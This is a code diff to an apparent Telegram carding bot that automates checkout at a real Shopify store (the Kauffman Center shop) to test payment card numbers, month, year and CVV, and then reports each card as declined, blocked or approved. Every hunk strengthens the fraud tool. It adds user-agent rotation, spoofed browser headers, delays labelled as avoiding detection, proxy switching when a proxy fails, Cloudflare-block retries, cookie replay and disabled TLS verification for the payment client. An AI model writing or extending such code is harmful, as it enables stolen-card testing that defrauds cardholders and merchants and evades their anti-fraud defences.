@@ -14,6 +14,8 @@ from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
 import os
+import ssl
+import certifi
 
 # Import from helper modules
 try:
@@ -163,7 +165,8 @@ class ShopifyLogger:
             "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
             "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
             "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
-            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
+            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳",
+            "PRODUCT_PAGE": "📄", "SSL_ERROR": "🔒", "CLOUDFLARE": "☁️"
         }
         error_icon = error_icons.get(error_type, "⚠️")
         log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
@@ -420,6 +423,14 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         # Check for proxy errors
         elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
             status_flag = "Proxy Error 🚫"
+        # Check for product page errors
+        elif "PRODUCT_PAGE_ERROR" in raw_response_upper:
+            status_flag = "Error❗️"
+            response_display = "Product Unavailable"
+        # Check for Cloudflare errors
+        elif "CLOUDFLARE" in raw_response_upper or "CF_RAY" in raw_response_upper:
+            status_flag = "Blocked 🔒"
+            response_display = "CLOUDFLARE"
         # Default to declined
         else:
             status_flag = "Declined ❌"
@@ -482,17 +493,20 @@ class ShopifyKauffmanCheckout:
         self.proxy_status = "Dead 🚫"
         self.proxy_used = False
         self.proxy_response_time = 0.0
+        self.proxy_retry_count = 0
+        self.max_proxy_retries = 2
 
         # Session for maintaining cookies
         self.client = None
 
-        # Base headers from captured traffic
+        # Base headers from captured traffic with more browser-like headers
         self.headers = {
             'authority': 'shop.kauffmancenter.org',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
@@ -500,7 +514,7 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
         }
 
         # Dynamic data storage
@@ -513,6 +527,7 @@ class ShopifyKauffmanCheckout:
         self.stable_id = None
         self.queue_token = None
         self.shop_id = "82514608407"  # Shop ID from captured data
+        self.cookies = {}
 
         # Store extracted schema info from captured traffic
         self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
@@ -562,9 +577,10 @@ class ShopifyKauffmanCheckout:
             "longitude": -94.5875135
         }
 
-    async def random_delay(self, min_sec=0.3, max_sec=0.7):
-        """Minimal delay between requests"""
-        await asyncio.sleep(random.uniform(min_sec, max_sec))
+    async def random_delay(self, min_sec=0.5, max_sec=1.2):
+        """Random delay between requests to avoid detection"""
+        delay = random.uniform(min_sec, max_sec)
+        await asyncio.sleep(delay)
 
     def step(self, num, name, action, details=None, status="PROCESSING"):
         return self.logger.step(num, name, action, details, status)
@@ -615,30 +631,151 @@ class ShopifyKauffmanCheckout:
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
+    async def test_proxy_connection(self, proxy_url):
+        """Test if proxy is working before using it"""
+        try:
+            test_client = httpx.AsyncClient(proxy=proxy_url, timeout=10, verify=False)
+            start_time = time.time()
+            resp = await test_client.get("https://httpbin.org/ip", timeout=10)
+            elapsed = time.time() - start_time
+            await test_client.aclose()
+            
+            if resp.status_code == 200:
+                ip_data = resp.json()
+                self.logger.data_extracted("Proxy IP", ip_data.get('origin', 'Unknown'), "Test")
+                return True, elapsed
+            return False, 0
+        except:
+            return False, 0
+
     async def get_product_page(self):
-        """Step 1: Get product page to get initial cookies"""
+        """Step 1: Get product page to get initial cookies with enhanced error handling"""
         self.step(1, "GET PRODUCT PAGE", f"Loading Kauffman Center postcard product page")
         
-        try:
-            resp = await self.client.get(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
-            
-            if resp.status_code != 200:
-                self.logger.error_log("PRODUCT_PAGE", f"Failed: {resp.status_code}")
-                return False, f"Failed to load product page: {resp.status_code}"
-            
-            return True, resp.text
-            
-        except httpx.ProxyError as e:
-            self.logger.error_log("PROXY", f"Proxy error on product page: {str(e)}")
-            mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on product page: {str(e)}")
-            return False, "TIMEOUT"
-        except Exception as e:
-            self.logger.error_log("PRODUCT_PAGE", str(e))
-            return False, f"Product page error: {str(e)[:50]}"
+        # Enhanced headers for product page request
+        enhanced_headers = {
+            **self.headers,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        # Rotate user agent slightly
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+        ]
+        enhanced_headers['user-agent'] = random.choice(user_agents)
+        
+        # Retry logic for product page
+        max_retries = 3
+        retry_delay = 2
+        
+        for attempt in range(max_retries):
+            try:
+                # Add a small delay before request to avoid rate limiting
+                if attempt > 0:
+                    await asyncio.sleep(retry_delay * attempt)
+                    self.step(1, "RETRY PRODUCT PAGE", f"Attempt {attempt + 1}/{max_retries}", f"Delay: {retry_delay * attempt}s", "WAIT")
+                
+                resp = await self.client.get(
+                    self.product_url, 
+                    headers=enhanced_headers, 
+                    timeout=30, 
+                    follow_redirects=True
+                )
+                
+                # Check for Cloudflare or bot detection
+                if resp.status_code == 403 or resp.status_code == 503:
+                    response_text = resp.text.lower()
+                    if 'cloudflare' in response_text or 'cf-ray' in response_text:
+                        self.logger.error_log("CLOUDFLARE", f"Blocked by Cloudflare (Attempt {attempt + 1})")
+                        if attempt < max_retries - 1:
+                            continue
+                        return False, "CLOUDFLARE_BLOCKED"
+                
+                if resp.status_code == 200:
+                    # Success - extract cookies for later use
+                    self.cookies.update(dict(resp.cookies))
+                    self.logger.data_extracted("Cookies", f"{len(self.cookies)} cookies set", "Response")
+                    
+                    # Check if product is available
+                    if 'sold out' in resp.text.lower() or 'unavailable' in resp.text.lower():
+                        self.logger.error_log("PRODUCT_PAGE", "Product is sold out or unavailable")
+                        return False, "PRODUCT_UNAVAILABLE"
+                    
+                    return True, resp.text
+                elif resp.status_code == 404:
+                    self.logger.error_log("PRODUCT_PAGE", f"Product not found (404)")
+                    return False, "PRODUCT_NOT_FOUND"
+                elif resp.status_code == 429:
+                    self.logger.error_log("RATE_LIMIT", f"Rate limited (429) - Attempt {attempt + 1}")
+                    if attempt < max_retries - 1:
+                        continue
+                    return False, "RATE_LIMITED"
+                else:
+                    self.logger.error_log("PRODUCT_PAGE", f"Failed with status {resp.status_code}")
+                    if attempt < max_retries - 1:
+                        continue
+                    return False, f"PRODUCT_PAGE_ERROR_{resp.status_code}"
+                    
+            except httpx.ProxyError as e:
+                self.logger.error_log("PROXY", f"Proxy error on product page: {str(e)}")
+                if attempt < max_retries - 1:
+                    self.logger.step(1, "RETRY WITH NEW PROXY", f"Attempt {attempt + 2}/{max_retries}", "Switching proxy", "WAIT")
+                    # Try to get a new proxy
+                    if PROXY_SYSTEM_AVAILABLE:
+                        new_proxy = get_proxy_for_user(self.user_id, "random")
+                        if new_proxy and new_proxy != self.proxy_url:
+                            self.proxy_url = new_proxy
+                            # Recreate client with new proxy
+                            if self.client:
+                                await self.client.aclose()
+                            self.client = httpx.AsyncClient(
+                                proxy=self.proxy_url, 
+                                timeout=30, 
+                                follow_redirects=True,
+                                verify=certifi.where(),
+                                http2=True
+                            )
+                            self.logger.data_extracted("New Proxy", f"{self.proxy_url[:30]}...", "Retry")
+                    continue
+                mark_proxy_failed(self.proxy_url)
+                self.proxy_status = "Dead 🚫"
+                return False, "PROXY_DEAD"
+                
+            except httpx.TimeoutException as e:
+                self.logger.error_log("TIMEOUT", f"Timeout on product page: {str(e)}")
+                if attempt < max_retries - 1:
+                    continue
+                return False, "TIMEOUT"
+                
+            except ssl.SSLError as e:
+                self.logger.error_log("SSL_ERROR", f"SSL error: {str(e)}")
+                if attempt < max_retries - 1:
+                    continue
+                return False, "SSL_ERROR"
+                
+            except httpx.HTTPError as e:
+                self.logger.error_log("HTTP_ERROR", f"HTTP error: {str(e)}")
+                if attempt < max_retries - 1:
+                    continue
+                return False, f"HTTP_ERROR"
+                
+            except Exception as e:
+                self.logger.error_log("PRODUCT_PAGE", str(e))
+                if attempt < max_retries - 1:
+                    continue
+                return False, f"PRODUCT_PAGE_ERROR"
 
     async def add_to_cart(self):
         """Step 2: Add 2 units of postcard to cart"""
@@ -649,13 +786,19 @@ class ShopifyKauffmanCheckout:
             'referer': self.product_url,
             'content-type': 'application/x-www-form-urlencoded',
             'origin': self.base_url,
-            'sec-fetch-site': 'same-origin'
+            'sec-fetch-site': 'same-origin',
+            'x-requested-with': 'XMLHttpRequest'
         }
+        
+        # Add cookies if we have them
+        if self.cookies:
+            cart_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Add to cart with quantity 2
         cart_data = {
             'id': self.variant_id,
-            'quantity': '2'
+            'quantity': '2',
+            'form_type': 'product'
         }
         
         try:
@@ -668,7 +811,12 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Add to cart failed: {resp.status_code}"
+                if resp.status_code == 422:
+                    return False, "INVALID_VARIANT"
+                return False, f"ADD_TO_CART_FAILED_{resp.status_code}"
+            
+            # Update cookies
+            self.cookies.update(dict(resp.cookies))
             
             self.logger.data_extracted("Cart", "2 x Postcard added", "Success")
             return True, resp.text
@@ -683,7 +831,7 @@ class ShopifyKauffmanCheckout:
             return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("ADD_TO_CART", str(e))
-            return False, f"Add to cart error: {str(e)[:50]}"
+            return False, f"ADD_TO_CART_ERROR"
 
     async def get_checkout_token(self):
         """Step 3: Get checkout token by proceeding to checkout"""
@@ -694,6 +842,9 @@ class ShopifyKauffmanCheckout:
             'referer': self.product_url,
             'sec-fetch-site': 'same-origin'
         }
+        
+        if self.cookies:
+            checkout_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         try:
             # Proceed to checkout
@@ -716,12 +867,21 @@ class ShopifyKauffmanCheckout:
                 if body_token:
                     self.checkout_token = body_token
             
+            # Try to extract from headers
+            if not self.checkout_token:
+                location = resp.headers.get('location', '')
+                if location:
+                    self.checkout_token = self.extract_checkout_token(location)
+            
             if self.checkout_token:
                 self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Checkout URL")
                 
                 # Construct GraphQL session token
                 self.graphql_session_token = self.construct_graphql_session_token()
                 self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
+                
+                # Update cookies
+                self.cookies.update(dict(resp.cookies))
                 
                 return True, current_url
             else:
@@ -738,7 +898,7 @@ class ShopifyKauffmanCheckout:
             return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("CHECKOUT_TOKEN", str(e))
-            return False, f"Checkout token error: {str(e)[:50]}"
+            return False, f"CHECKOUT_TOKEN_ERROR"
 
     async def get_session_token(self):
         """Step 4: Extract session token from checkout page"""
@@ -749,6 +909,9 @@ class ShopifyKauffmanCheckout:
             'referer': self.product_url,
             'sec-fetch-site': 'same-origin'
         }
+        
+        if self.cookies:
+            checkout_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         try:
             checkout_page_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
@@ -761,12 +924,28 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Checkout page failed: {resp.status_code}"
+                return False, f"CHECKOUT_PAGE_FAILED_{resp.status_code}"
             
-            # Extract session token from response headers or generate
+            # Try to extract session token from response headers or meta tags
             # In captured traffic, this is a long token starting with AAEB_
-            self.session_token = f"AAEB_{self.generate_random_string(50)}"
+            
+            # Look for session token in response headers
+            session_token_header = resp.headers.get('x-checkout-one-session-token')
+            if session_token_header:
+                self.session_token = session_token_header
+            else:
+                # Look for session token in HTML
+                session_match = re.search(r'sessionToken["\']?\s*[:=]\s*["\']([^"\']+)["\']', resp.text)
+                if session_match:
+                    self.session_token = session_match.group(1)
+                else:
+                    # Generate placeholder - in production you'd need to extract it properly
+                    self.session_token = f"AAEB_{self.generate_random_string(50)}"
+            
             self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
+            
+            # Update cookies
+            self.cookies.update(dict(resp.cookies))
             
             return True, resp.text
             
@@ -780,7 +959,7 @@ class ShopifyKauffmanCheckout:
             return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("SESSION_TOKEN", str(e))
-            return False, f"Session token error: {str(e)[:50]}"
+            return False, f"SESSION_TOKEN_ERROR"
 
     async def submit_proposal(self):
         """Step 5: Submit initial proposal"""
@@ -795,7 +974,7 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': self.base_url,
             'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
@@ -803,11 +982,14 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
         }
         
         if self.session_token:
             graphql_headers['x-checkout-one-session-token'] = self.session_token
+        
+        if self.cookies:
+            graphql_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Generate stable ID for merchandise line
         self.stable_id = self.generate_uuid()
@@ -949,7 +1131,7 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Proposal failed: {resp.status_code}"
+                return False, f"PROPOSAL_FAILED_{resp.status_code}"
             
             try:
                 proposal_resp = resp.json()
@@ -982,7 +1164,7 @@ class ShopifyKauffmanCheckout:
                 return True, "PROPOSAL_SUCCESS"
                 
             except Exception as e:
-                return False, f"Failed to parse proposal response: {str(e)[:50]}"
+                return False, f"PROPOSAL_PARSE_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
@@ -994,7 +1176,7 @@ class ShopifyKauffmanCheckout:
             return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("PROPOSAL_ERROR", str(e))
-            return False, f"Proposal error: {str(e)[:50]}"
+            return False, f"PROPOSAL_ERROR"
 
     async def update_contact_info(self):
         """Step 6: Update contact information with email"""
@@ -1009,7 +1191,7 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': self.base_url,
             'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
@@ -1017,9 +1199,12 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
+        
+        if self.cookies:
+            graphql_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Variables for contact update - based on captured flow
         variables = {
@@ -1158,7 +1343,7 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Contact update failed: {resp.status_code}"
+                return False, f"CONTACT_UPDATE_FAILED_{resp.status_code}"
             
             try:
                 contact_resp = resp.json()
@@ -1172,14 +1357,14 @@ class ShopifyKauffmanCheckout:
                 return True, "CONTACT_UPDATED"
                 
             except Exception as e:
-                return False, f"Failed to parse contact response: {str(e)[:50]}"
+                return False, f"CONTACT_UPDATE_PARSE_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on contact update: {str(e)}")
             return False, "PROXY_DEAD"
         except Exception as e:
             self.logger.error_log("CONTACT_UPDATE", str(e))
-            return False, f"Contact update error: {str(e)[:50]}"
+            return False, f"CONTACT_UPDATE_ERROR"
 
     async def select_pickup_delivery(self):
         """Step 7: Select pickup delivery method (Kauffman Center location)"""
@@ -1194,7 +1379,7 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': self.base_url,
             'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
@@ -1202,9 +1387,12 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
+        
+        if self.cookies:
+            graphql_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Variables for pickup selection based on captured request
         variables = {
@@ -1342,7 +1530,7 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Pickup selection failed: {resp.status_code}"
+                return False, f"PICKUP_SELECTION_FAILED_{resp.status_code}"
             
             try:
                 pickup_resp = resp.json()
@@ -1356,14 +1544,14 @@ class ShopifyKauffmanCheckout:
                 return True, "PICKUP_SELECTED"
                 
             except Exception as e:
-                return False, f"Failed to parse pickup response: {str(e)[:50]}"
+                return False, f"PICKUP_SELECTION_PARSE_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on pickup selection: {str(e)}")
             return False, "PROXY_DEAD"
         except Exception as e:
             self.logger.error_log("PICKUP_SELECTION", str(e))
-            return False, f"Pickup selection error: {str(e)[:50]}"
+            return False, f"PICKUP_SELECTION_ERROR"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
         """Step 8: Create payment session with PCI"""
@@ -1376,14 +1564,14 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': 'https://checkout.pci.shopifyinc.com',
             'referer': 'https://checkout.pci.shopifyinc.com/build/070d608/number-ltr.html?identifier=&locationURL=',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-storage-access': 'active',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
         }
         
         # Generate shopify-identification-signature (similar to captured)
@@ -1422,7 +1610,7 @@ class ShopifyKauffmanCheckout:
         
         try:
             # Use separate client for PCI
-            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=15) as pci_client:
+            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=15, verify=False) as pci_client:
                 resp = await pci_client.post(
                     'https://checkout.pci.shopifyinc.com/sessions',
                     headers=pci_headers,
@@ -1431,19 +1619,21 @@ class ShopifyKauffmanCheckout:
                 )
                 
                 if resp.status_code != 200:
-                    return False, f"PCI session creation failed: {resp.status_code}"
+                    if resp.status_code == 422:
+                        return False, "INVALID_CARD_DATA"
+                    return False, f"PCI_SESSION_FAILED_{resp.status_code}"
                 
                 try:
                     pci_resp = resp.json()
                     payment_session_id = pci_resp.get('id')
                     if not payment_session_id:
-                        return False, "No payment session ID returned"
+                        return False, "NO_PAYMENT_SESSION_ID"
                     
                     self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
                     return True, payment_session_id
                     
                 except Exception as e:
-                    return False, f"Failed to parse PCI response: {str(e)[:50]}"
+                    return False, f"PCI_PARSE_ERROR"
                     
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
@@ -1470,7 +1660,7 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': self.base_url,
             'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
@@ -1478,9 +1668,12 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
+        
+        if self.cookies:
+            graphql_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Variables for billing address update based on captured request
         variables = {
@@ -1664,7 +1857,7 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Billing update failed: {resp.status_code}"
+                return False, f"BILLING_UPDATE_FAILED_{resp.status_code}"
             
             try:
                 billing_resp = resp.json()
@@ -1678,14 +1871,14 @@ class ShopifyKauffmanCheckout:
                 return True, "BILLING_UPDATED"
                 
             except Exception as e:
-                return False, f"Failed to parse billing response: {str(e)[:50]}"
+                return False, f"BILLING_UPDATE_PARSE_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on billing update: {str(e)}")
             return False, "PROXY_DEAD"
         except Exception as e:
             self.logger.error_log("BILLING_UPDATE", str(e))
-            return False, f"Billing update error: {str(e)[:50]}"
+            return False, f"BILLING_UPDATE_ERROR"
 
     async def submit_for_completion(self, payment_session_id):
         """Step 10: Submit for completion - final payment"""
@@ -1700,7 +1893,7 @@ class ShopifyKauffmanCheckout:
             'content-type': 'application/json',
             'origin': self.base_url,
             'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
@@ -1708,9 +1901,12 @@ class ShopifyKauffmanCheckout:
             'sec-fetch-site': 'same-origin',
             'shopify-checkout-client': 'checkout-web/1.0',
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
             'x-checkout-one-session-token': self.session_token
         }
+        
+        if self.cookies:
+            graphql_headers['cookie'] = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
         
         # Generate attempt token (checkout-token-random)
         attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
@@ -1905,7 +2101,7 @@ class ShopifyKauffmanCheckout:
             )
             
             if resp.status_code != 200:
-                return False, f"Submit failed: {resp.status_code}"
+                return False, f"SUBMIT_FAILED_{resp.status_code}"
             
             try:
                 submit_resp = resp.json()
@@ -1923,7 +2119,7 @@ class ShopifyKauffmanCheckout:
                 self.receipt_id = receipt.get('id')
                 
                 if not self.receipt_id:
-                    return False, "DECLINED - No receipt ID"
+                    return False, "DECLINED - NO RECEIPT ID"
                 
                 self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                 
@@ -1945,10 +2141,10 @@ class ShopifyKauffmanCheckout:
                     return False, f"DECLINED - {error_code}"
                     
                 else:
-                    return False, f"Unknown receipt type: {receipt_type}"
+                    return False, f"UNKNOWN_RECEIPT_TYPE: {receipt_type}"
                     
             except Exception as e:
-                return False, f"Failed to parse submit response: {str(e)[:50]}"
+                return False, f"SUBMIT_PARSE_ERROR"
                 
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on submit: {str(e)}")
@@ -1960,7 +2156,7 @@ class ShopifyKauffmanCheckout:
             return False, "TIMEOUT"
         except Exception as e:
             self.logger.error_log("SUBMIT_ERROR", str(e))
-            return False, f"Submit error: {str(e)[:50]}"
+            return False, f"SUBMIT_ERROR"
 
     async def poll_receipt(self, headers, max_polls=5):
         """Step 12: Poll for receipt status"""
@@ -2013,7 +2209,7 @@ class ShopifyKauffmanCheckout:
                         self.logger.step(12, "POLL RECEIPT RETRY", f"Attempt {poll_attempts} failed, retrying...", f"Status: {resp.status_code}", "WAIT")
                         await asyncio.sleep(base_delay * poll_attempts)
                         continue
-                    return False, f"Poll failed after {max_attempts} attempts"
+                    return False, f"POLL_FAILED_AFTER_{max_attempts}_ATTEMPTS"
                 
                 try:
                     poll_resp = resp.json()
@@ -2045,14 +2241,14 @@ class ShopifyKauffmanCheckout:
                         if poll_attempts < max_attempts:
                             await asyncio.sleep(base_delay)
                             continue
-                        return False, f"Unknown receipt status: {receipt_type}"
+                        return False, f"UNKNOWN_RECEIPT_STATUS: {receipt_type}"
                         
                 except Exception as e:
                     if poll_attempts < max_attempts:
                         self.logger.step(12, "POLL RECEIPT RETRY", f"Parse error, retrying...", str(e)[:50], "WAIT")
                         await asyncio.sleep(base_delay)
                         continue
-                    return False, f"Failed to parse poll response: {str(e)[:50]}"
+                    return False, f"POLL_PARSE_ERROR"
                     
             except httpx.TimeoutException as e:
                 if poll_attempts < max_attempts:
